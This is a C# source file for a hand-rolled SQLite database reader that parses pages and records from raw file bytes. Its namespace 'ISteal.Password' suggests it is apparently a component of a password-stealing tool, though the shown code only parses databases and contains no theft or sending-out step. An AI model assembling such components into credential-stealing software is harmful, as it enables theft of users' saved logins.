using System;
using System.IO;
using System.Text;

namespace ISteal.Password
{
    public class Sqlite
    {
        public Sqlite(string fileName)
        {
            _fileBytes = File.ReadAllBytes(fileName);
            _pageSize = ConvertToULong(16, 2);
            _dbEncoding = ConvertToULong(56, 4);
            ReadMasterTable(100L);
        }

        public string GetValue(int rowNum, int field)
        {
            string result;
            try
            {
                if (rowNum >= _tableEntries.Length)
                {
                    result = null;
                }
                else
                {
                    result = ((field >= _tableEntries[rowNum].Content.Length) ? null : _tableEntries[rowNum].Content[field]);
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }

        public int GetRowCount() => _tableEntries.Length;

        private bool ReadTableFromOffset(ulong offset)
        {
            bool result;
            try
            {
                if (_fileBytes[(int)(checked(offset))] == 13)
                {
                    ushort num = (ushort)(ConvertToULong((int)offset + 3, 2) - 1uL);
                    int num2 = 0;
                    if (_tableEntries != null)
                    {
                        num2 = _tableEntries.Length;
                        Array.Resize(ref _tableEntries, _tableEntries.Length + num + 1);
                    }
                    else
                    {
                        _tableEntries = new TableEntry[(num + 1)];
                    }
                    for (ushort num3 = 0; num3 <= num; num3 += 1)
                    {
                        ulong num4 = ConvertToULong((int)offset + 8 + num3 * 2, 2);
                        if (offset != 100uL)
                        {
                            num4 += offset;
                        }
                        int num5 = Gvl((int)num4);
                        Cvl((int)num4, num5);
                        int num6 = Gvl((int)(num4 + (ulong)(num5 - (long)num4) + 1uL));
                        Cvl((int)(num4 + (ulong)(num5 - (long)num4) + 1uL), num6);
                        num4 += (ulong)(num6 - (long)num4 + 1L);
                        num5 = Gvl((int)num4);
                        num6 = num5;
                        long num7 = Cvl((int)num4, num5);
                        RecordHeaderField[] array = null;
                        long num8 = (long)(num4 - (ulong)num5 + 1uL);
                        int num9 = 0;
                        while (num8 < num7)
                        {
                            Array.Resize(ref array, num9 + 1);
                            num5 = num6 + 1;
                            num6 = Gvl(num5);
                            array[num9].Type = Cvl(num5, num6);
                            if (array[num9].Type > 9L)
                            {
                                if (IsOdd(array[num9].Type))
                                {
                                    array[num9].Size = (array[num9].Type - 13L) / 2L;
                                }
                                else
                                {
                                    array[num9].Size = (array[num9].Type - 12L) / 2L;
                                }
                            }
                            else
                            {
                                array[num9].Size = (long)((ulong)_sqlDataTypeSize[(int)(checked(array[num9].Type))]);
                            }
                            num8 = num8 + (num6 - num5) + 1L;
                            num9++;
                        }
                        if (array != null)
                        {
                            _tableEntries[num2 + num3].Content = new string[array.Length];
                            int num10 = 0;
                            for (int i = 0; i <= array.Length - 1; i++)
                            {
                                if (array[i].Type > 9L)
                                {
                                    if (!IsOdd(array[i].Type))
                                    {
                                        if (_dbEncoding == 1uL)
                                        {
                                            _tableEntries[num2 + num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)num10), (int)array[i].Size);
                                        }
                                        else if (_dbEncoding == 2uL)
                                        {
                                            _tableEntries[num2 + num3].Content[i] = Encoding.Unicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)num10), (int)array[i].Size);
                                        }
                                        else if (_dbEncoding == 3uL)
                                        {
                                            _tableEntries[num2 + num3].Content[i] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)num10), (int)array[i].Size);
                                        }
                                    }
                                    else
                                    {
                                        _tableEntries[num2 + num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)num10), (int)array[i].Size);
                                    }
                                }
                                else
                                {
                                    _tableEntries[num2 + num3].Content[i] = Convert.ToString(ConvertToULong((int)(num4 + (ulong)num7 + (ulong)num10), (int)array[i].Size));
                                }
                                num10 += (int)array[i].Size;
                            }
                        }
                    }
                }
                else if (_fileBytes[(int)(checked(offset))] == 5)
                {
                    ushort num11 = (ushort)(ConvertToULong((int)(offset + 3uL), 2) - 1uL);
                    for (ushort num12 = 0; num12 <= num11; num12 += 1)
                    {
                        ushort num13 = (ushort)ConvertToULong((int)offset + 12 + num12 * 2, 2);
                        ReadTableFromOffset((ConvertToULong((int)(offset + num13), 4) - 1uL) * _pageSize);
                    }
                    ReadTableFromOffset((ConvertToULong((int)(offset + 8uL), 4) - 1uL) * _pageSize);
                }
                result = true;
            }
            catch
            {
                result = false;
            }
            return result;
        }

        private void ReadMasterTable(long offset)
        {
            try
            {
                byte b = _fileBytes[(int)(checked(offset))];
                if (b != 5)
                {
                    if (b == 13)
                    {
                        ulong num = ConvertToULong((int)offset + 3, 2) - 1uL;
                        int num2 = 0;
                        if (_masterTableEntries != null)
                        {
                            num2 = _masterTableEntries.Length;
                            Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num + 1);
                        }
                        else
                        {
                            _masterTableEntries = new SqliteMasterEntry[num + 1uL];
                        }
                        for (ulong num3 = 0uL; num3 <= num; num3 += 1uL)
                        {
                            ulong num4 = ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
                            if (offset != 100L)
                            {
                                num4 += (ulong)offset;
                            }
                            int num5 = Gvl((int)num4);
                            Cvl((int)num4, num5);
                            int num6 = Gvl((int)(num4 + (ulong)(num5 - (long)num4) + 1uL));
                            Cvl((int)(num4 + (ulong)(num5 - (long)num4) + 1uL), num6);
                            num4 += (ulong)(num6 - (long)num4 + 1L);
                            num5 = Gvl((int)num4);
                            num6 = num5;
                            long num7 = Cvl((int)num4, num5);
                            long[] array = new long[5];
                            for (int i = 0; i <= 4; i++)
                            {
                                num5 = num6 + 1;
                                num6 = Gvl(num5);
                                array[i] = Cvl(num5, num6);
                                if (array[i] > 9L)
                                {
                                    if (IsOdd(array[i]))
                                    {
                                        array[i] = (array[i] - 13L) / 2L;
                                    }
                                    else
                                    {
                                        array[i] = (array[i] - 12L) / 2L;
                                    }
                                }
                                else
                                {
                                    array[i] = (long)((ulong)_sqlDataTypeSize[(int)(checked(array[i]))]);
                                }
                            }
                            if (_dbEncoding != 1uL && _dbEncoding != 2uL)
                            {
                                ulong arg_19A_0 = _dbEncoding;
                            }
                            if (_dbEncoding == 1uL)
                            {
                                _masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
                            }
                            else if (_dbEncoding == 2uL)
                            {
                                _masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
                            }
                            else if (_dbEncoding == 3uL)
                            {
                                _masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
                            }
                            _masterTableEntries[num2 + (int)num3].RootNum = (long)ConvertToULong((int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
                            if (_dbEncoding == 1uL)
                            {
                                _masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                            }
                            else if (_dbEncoding == 2uL)
                            {
                                _masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                            }
                            else if (_dbEncoding == 3uL)
                            {
                                _masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                            }
                        }
                    }
                }
                else
                {
                    for (int j = 0; j <= (ushort)(ConvertToULong((int)offset + 3, 2) - 1uL); j++)
                    {
                        ushort num9 = (ushort)ConvertToULong((int)offset + 12 + j * 2, 2);
                        if (offset == 100L)
                        {
                            ReadMasterTable((long)((ConvertToULong(num9, 4) - 1uL) * _pageSize));
                        }
                        else
                        {
                            ReadMasterTable((long)((ConvertToULong((int)(offset + (long)((ulong)num9)), 4) - 1uL) * _pageSize));
                        }
                    }
                    ReadMasterTable((long)((ConvertToULong((int)offset + 8, 4) - 1uL) * _pageSize));
                }
            }
            catch
            {
            }
        }

        public bool ReadTable(string tableName)
        {
            bool result;
            try
            {
                int num = -1;
                for (int i = 0; i <= _masterTableEntries.Length; i++)
                {
                    if (string.Compare(_masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
                    {
                        num = i;
                        break;
                    }
                }
                if (num == -1)
                {
                    result = false;
                }
                else
                {
                    string[] array = _masterTableEntries[num].SqlStatement.Substring(_masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
                    {
                        ','
                    });
                    for (int j = 0; j <= array.Length - 1; j++)
                    {
                        array[j] = array[j].TrimStart(new char[0]);
                        int num2 = array[j].IndexOf(' ');
                        if (num2 > 0)
                        {
                            array[j] = array[j].Substring(0, num2);
                        }
                        if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
                        {
                            Array.Resize(ref _fieldNames, j + 1);
                            _fieldNames[j] = array[j];
                        }
                    }
                    result = ReadTableFromOffset((ulong)((_masterTableEntries[num].RootNum - 1L) * (long)_pageSize));
                }
            }
            catch
            {
                result = false;
            }
            return result;
        }

        private ulong ConvertToULong(int startIndex, int size)
        {
            ulong result;
            try
            {
                if (size > 8 | size == 0)
                {
                    result = 0uL;
                }
                else
                {
                    var num = 0uL;
                    for (var i = 0; i <= size - 1; i++)
                    {
                        num = (num << 8 | _fileBytes[startIndex + i]);
                    }
                    result = num;
                }
            }
            catch
            {
                result = 0uL;
            }
            return result;
        }

        private int Gvl(int startIdx)
        {
            int result;
            try
            {
                if (startIdx > _fileBytes.Length)
                {
                    result = 0;
                }
                else
                {
                    for (int i = startIdx; i <= startIdx + 8; i++)
                    {
                        if (i > _fileBytes.Length - 1)
                        {
                            result = 0;
                            return result;
                        }
                        if ((_fileBytes[i] & 128) != 128)
                        {
                            result = i;
                            return result;
                        }
                    }
                    result = startIdx + 8;
                }
            }
            catch
            {
                result = 0;
            }
            return result;
        }

        private long Cvl(int startIdx, int endIdx)
        {
            long result;
            try
            {
                endIdx++;
                byte[] array = new byte[8];
                var num = endIdx - startIdx;
                var flag = false;
                if (num == 0 | num > 9)
                {
                    result = 0L;
                }
                else if (num == 1)
                {
                    array[0] = (byte)(_fileBytes[startIdx] & 127);
                    result = BitConverter.ToInt64(array, 0);
                }
                else
                {
                    if (num == 9)
                    {
                        flag = true;
                    }
                    int num2 = 1;
                    int num3 = 7;
                    int num4 = 0;
                    if (flag)
                    {
                        array[0] = _fileBytes[endIdx - 1];
                        endIdx--;
                        num4 = 1;
                    }
                    for (int i = endIdx - 1; i >= startIdx; i += -1)
                    {
                        if (i - 1 >= startIdx)
                        {
                            array[num4] = (byte)((_fileBytes[i] >> num2 - 1 & 255 >> num2) | _fileBytes[i - 1] << num3);
                            num2++;
                            num4++;
                            num3--;
                        }
                        else if (!flag)
                        {
                            array[num4] = (byte)(_fileBytes[i] >> num2 - 1 & 255 >> num2);
                        }
                    }
                    result = BitConverter.ToInt64(array, 0);
                }
            }
            catch
            {
                result = 0L;
            }
            return result;
        }

        private static bool IsOdd(long value) => (value & 1L) == 1L;

        private readonly ulong _dbEncoding;
        private readonly byte[] _fileBytes;
        private readonly ulong _pageSize;
        private readonly byte[] _sqlDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

        private string[] _fieldNames;
        private SqliteMasterEntry[] _masterTableEntries;
        private TableEntry[] _tableEntries;

        private struct RecordHeaderField
        {
            public long Size;
            public long Type;
        }

        private struct TableEntry
        {
            public string[] Content;
        }

        private struct SqliteMasterEntry
        {
            public string ItemName;
            public long RootNum;
            public string SqlStatement;
        }
    }
}